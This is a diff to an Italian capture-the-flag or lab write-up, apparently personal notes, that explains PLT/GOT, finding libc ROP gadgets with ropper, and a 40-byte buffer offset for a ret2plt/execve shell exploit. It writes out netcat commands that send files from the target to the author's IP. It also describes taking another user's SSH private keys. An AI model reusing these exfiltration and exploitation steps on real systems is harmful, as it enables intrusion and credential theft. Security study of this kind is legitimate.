@@ -247,7 +247,74 @@ L'ALSR randomizza l'indirizzo a cui viene mappata la libreria libc ad ogni esecu
 Segue una breve spiegazione dell'utilizzo delle tabelle PLT e GOT da parte del programma.
 
 Quando il programma viene eseguito, mappa la libc e altre librerie dinamiche ad un indirizzo random in memoria. Ogni qual volta che una funzione di tale libreria viene chiamata per la prima volta, il linker calcola il suo indirizzo e lo inserisce nella GOT, compilandola man mano che le funzioni vengono chiamate. In questo modo solo gli indirizzi delle funzioni che vengono effettivamente utilizzate dal programma vengono calcolati e caricati. 
-Quando una funzione della libc viene chiamata, analizzando tramite gdb, accanto all'istruzione di chiamata `call 0x222222 ` compare \<puts@plt\>. Questo tag indica che l'indirizzo corrisponde all'entry plt della tabella PLT. Tale tabella contiene una istruzione di salto incondizionato verso la corrispondente entri della GOT. Se tale entry è vuota allora viene chiamata la procedura che calcola l'indirizzo, altrimenti la funzione puts viene direttamente chiamata.
+Quando una funzione della libc viene chiamata, analizzando tramite gdb, accanto all'istruzione di chiamata `call 0x222222 ` compare \<puts@plt\>. Questo tag indica che l'indirizzo corrisponde non è quello della puts ma di una procedura all'interno della PLT. Questa procedura trova l'indirizzo della puts e lo inserisce nella entry corripondente della GOT se è la prima volta che la puts viene chiamata, altrimenti salta direttamente a tale indirizzo. 
+
+Per iniziare a cercare gadget all'interno della libreria libc, ho bisogno di sapere l'esatta versione utilizzata dalla macchina; se utilizzassi una versione anche leggermente differente l'exploit non funzionerebbe. 
+In queso caso però ho diretto accesso alla macchina (via reverse shell ottenuta in precedenza) quindi posso direttamente prendere l'ELF della libreria all'interno del container. 
+
+![[Pasted image 20250620103928.png]]
+![[Pasted image 20250620104004.png]]
+![[Pasted image 20250620104033.png]]
+
+Dopo alcune ricerche all'interno del container ho trovato il file corretto, ovvero:
+`/lib/x86_64-linux-gnu/libc-2.23.so`
+
+Mentre ho cercato per tale file all'interno della macchina, ho anche trovato delle chiavi rsa (publiche e private) relative a ssh nella home di zeeshan. Ho portano anche queste nella mia macchina, serviranno dopo.
+Per fare entrambi i trasferimenti di file il metodo precedente che avevo usato ovvero un server PHP sulla mia macchina non ha funzionato. Ho utilizzato quindi netcat che è gia installato sulla macchina:
+```
+ricevente: nc -l -p 9999 > libc-2.23.so 
+target:    nc -w 3 10.9.1.44 9999 < /lib/x86_64-linux-gnu/libc-2.23.so
+```
+
+Una volta raccolti tutti i file necessari, ho iniziato a costruire lo script con pwntools, specificando la libc che ho prelevato dal container.
+
+![[Pasted image 20250620104728.png]]
+
+Lo scopo adesso è trovare dei gadget nella libc che permettano di spawnare la shell. Per fare questo è necessario eseguire la systemcall execve con '/bin/sh' come parametro. Essendo che gli ELF hanno architettura x86_64, la convenzione per effettuare tale chiamata è la seguente:
+
+- rax <- `0x3b`
+- rdi  <- `'/bin/sh'`
+- rsi  <- `NULL`
+- rdx <- `NULL`
+
+fonte: https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86_64-64_bit
+
+L'idea per ottenere una shell tramite ROP è la seguente: ho bisogno di gadget che mi
+permettano di riempire (tramite operazioni pop dallo stack) i registri come indicato sopra e
+infine il gadget int syscall che genera una interrupt ed effettua una systemcall.
+Listruzione int syscall necessita di trovare il numero della systemcall che si vuole chiamare
+allinterno del registro rax (0x3b in questo caso ovvero 59 per la execve ). Subito dopo viene
+quindi eseguita la execve che esegue qualsiasi eseguibile dato un determinato path come
+parametro. Essa puo essere utilizzata con un numero variabile di parametri e li preleva in
+ordine da rdi, rsi e rdx. Essendo che ho specificato soltanto un parametro (il
+path ' /bin/sh' ) gli altri due registri devono contenere il valore NULL.
+
+Ho utilzzato ropper per trovare i gadget all'interno della libc.
+
+![[Pasted image 20250620105936.png]]
+
+Con il seguente trovato ho trovato il mio primo gadget (uno qualsiasi di quelli in figura), che si occuperà di riempire il registro rax con il valore 0x3b dallo stack.
+Ripetendo il comando con le altre istruzioni ho trovato tutti gli altri gadget necessari, compresa l'istruzione syscall.
+
+Per prima cosa ho trovato la lunghezza del buffer, che è di 40 bytes.
+
+![[Pasted image 20250620110556.png]]
+
+Ho poi scritto uno script che si occupa soltanto di stampare l'indirizzo puts@plt e di trovare l'indirizzo effettivo in memoria della funzione plt, via ret2plt:
+
+![[Pasted image 20250620110420.png]]
+
+L'output dell'esecuzione dello script è il seguente:
+![[Pasted image 20250620110639.png]]
+
+quindi sembra funzionare correttamente, stampando l'indirizzo puts@plt
+
+
+
+
+
+
+
 
 
 ----
